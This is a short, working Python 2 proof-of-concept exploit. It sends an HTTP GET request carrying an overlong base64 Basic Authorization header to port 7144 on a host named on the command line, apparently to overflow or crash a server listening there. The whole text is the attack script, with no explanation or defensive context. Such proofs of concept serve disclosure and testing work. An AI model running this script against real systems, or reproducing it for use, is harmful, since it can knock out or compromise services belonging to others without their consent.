#!/usr/bin/env python

import sys, socket

port = 7144
buff = 'GET /http/ HTTP/1.1\n'
buff+= 'Connection: close\n'
buff+= 'Accept: */*\n'
buff+= 'Authorization: Basic OmZ' + 'vb29'*128 + 'vbwo=' + '\r\n'

if(len(sys.argv) < 2):
	print "ERR: please specify a hostname"
	sys.exit(-1)

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], port))
	s.send(buff);
except:
	print "ERR: socket()"
	sys.exit(-1)
